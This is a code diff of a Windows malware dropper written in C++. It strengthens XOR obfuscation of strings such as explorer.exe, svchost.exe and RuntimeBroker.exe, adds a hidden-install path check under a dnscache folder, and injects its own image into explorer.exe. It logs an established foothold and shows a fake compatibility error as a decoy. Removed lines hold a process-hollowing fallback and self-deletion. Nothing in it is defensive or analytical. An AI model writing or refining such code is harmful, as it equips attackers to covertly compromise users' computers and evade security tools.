@@ -19,12 +19,12 @@
 #include <thread>
 
 namespace {
-    // XOR Encrypted Strings (Key 0x5A)
-    const wchar_t kExplorerEnc[] = { 'e'^0x5A, 'x'^0x5A, 'p'^0x5A, 'l'^0x5A, 'o'^0x5A, 'r'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // explorer.exe
-    const wchar_t kSvchostEnc[] = { 's'^0x5A, 'v'^0x5A, 'c'^0x5A, 'h'^0x5A, 'o'^0x5A, 's'^0x5A, 't'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // svchost.exe
-    const wchar_t kVolatileEnvEnc[] = { 'V'^0x5A, 'o'^0x5A, 'l'^0x5A, 'a'^0x5A, 't'^0x5A, 'i'^0x5A, 'l'^0x5A, 'e'^0x5A, ' '^0x5A, 'E'^0x5A, 'n'^0x5A, 'v'^0x5A, 'i'^0x5A, 'r'^0x5A, 'o'^0x5A, 'n'^0x5A, 'm'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A }; // Volatile Environment
-    const wchar_t kDropperPathEnc[] = { 'D'^0x5A, 'r'^0x5A, 'o'^0x5A, 'p'^0x5A, 'p'^0x5A, 'e'^0x5A, 'r'^0x5A, 'P'^0x5A, 'a'^0x5A, 't'^0x5A, 'h'^0x5A }; // DropperPath
-    const wchar_t kRuntimeBrokerEnc[] = { 'R'^0x5A, 'u'^0x5A, 'n'^0x5A, 't'^0x5A, 'i'^0x5A, 'm'^0x5A, 'e'^0x5A, 'B'^0x5A, 'r'^0x5A, 'o'^0x5A, 'k'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // RuntimeBroker.exe
+    // XOR Encrypted Strings (Multi-byte Key)
+    const wchar_t kExplorerEnc[] = { 'e'^0x4B, 'x'^0x1F, 'p'^0x8C, 'l'^0x3E, 'o'^0x4B, 'r'^0x1F, 'e'^0x8C, 'r'^0x3E, '.'^0x4B, 'e'^0x1F, 'x'^0x8C, 'e'^0x3E }; // explorer.exe
+    const wchar_t kSvchostEnc[] = { 's'^0x4B, 'v'^0x1F, 'c'^0x8C, 'h'^0x3E, 'o'^0x4B, 's'^0x1F, 't'^0x8C, '.'^0x3E, 'e'^0x4B, 'x'^0x1F, 'e'^0x8C }; // svchost.exe
+    const wchar_t kVolatileEnvEnc[] = { 'V'^0x4B, 'o'^0x1F, 'l'^0x8C, 'a'^0x3E, 't'^0x4B, 'i'^0x1F, 'l'^0x8C, 'e'^0x3E, ' '^0x4B, 'E'^0x1F, 'n'^0x8C, 'v'^0x3E, 'i'^0x4B, 'r'^0x1F, 'o'^0x8C, 'n'^0x3E, 'm'^0x4B, 'e'^0x1F, 'n'^0x8C, 't'^0x3E }; // Volatile Environment
+    const wchar_t kDropperPathEnc[] = { 'D'^0x4B, 'r'^0x1F, 'o'^0x8C, 'p'^0x3E, 'p'^0x4B, 'e'^0x1F, 'r'^0x8C, 'P'^0x3E, 'a'^0x4B, 't'^0x1F, 'h'^0x8C }; // DropperPath
+    const wchar_t kRuntimeBrokerEnc[] = { 'R'^0x4B, 'u'^0x1F, 'n'^0x8C, 't'^0x3E, 'i'^0x4B, 'm'^0x1F, 'e'^0x8C, 'B'^0x3E, 'r'^0x4B, 'o'^0x1F, 'k'^0x8C, 'e'^0x3E, 'r'^0x4B, '.'^0x1F, 'e'^0x8C, 'x'^0x3E, 'e'^0x4B }; // RuntimeBroker.exe
 
     std::vector<uint8_t> GetSelfImage() {
         wchar_t path[MAX_PATH];
@@ -58,11 +58,8 @@ namespace {
         std::wstring lowerPath = sPath;
         for (auto& c : lowerPath) c = (wchar_t)::towlower(c);
 
-        if (lowerPath.find(L"\\appdata\\local\\microsoft\\") != std::wstring::npos ||
-            lowerPath.find(L"\\programdata\\microsoft\\") != std::wstring::npos) {
-            if (lowerPath.find(L"\\temp\\") == std::wstring::npos && lowerPath.find(L"\\tmp\\") == std::wstring::npos) {
-                return true;
-            }
+        if (lowerPath.find(L"\\microsoft\\windows\\dnscache\\") != std::wstring::npos) {
+            return true;
         }
         return false;
     }
@@ -160,35 +157,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     evasion::JunkLogic::GenerateEntropy();
 
-    // 3. Attempt Relocation (Injection/Hollowing)
+    // 3. Attempt Relocation (Injection)
     std::vector<uint8_t> selfImage = GetSelfImage();
     if (!selfImage.empty()) {
         // Try explorer.exe first
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
-            decoy::ShowBSOD();
+            LOG_INFO("Dropper: Foothold established in explorer.exe.");
+            decoy::ShowCompatibilityError();
             CoUninitialize();
-            utils::SelfDeleteAndExit();
-            return 0;
-        }
-
-        evasion::JunkLogic::PerformComplexMath();
-
-        // Try RuntimeBroker.exe hollowing
-        wchar_t systemPath[MAX_PATH];
-        GetSystemDirectoryW(systemPath, MAX_PATH);
-        std::wstring rb = utils::DecryptW(kRuntimeBrokerEnc, 17);
-        std::wstring target = std::wstring(systemPath) + L"\\" + rb;
-
-        if (evasion::Injector::HollowProcess(target, selfImage)) {
-            decoy::ShowBSOD();
-            CoUninitialize();
-            utils::SelfDeleteAndExit();
             return 0;
         }
     }
 
-    decoy::ShowBSOD();
+    decoy::ShowCompatibilityError();
     CoUninitialize();
-    utils::SelfDeleteAndExit();
     return 0;
 }
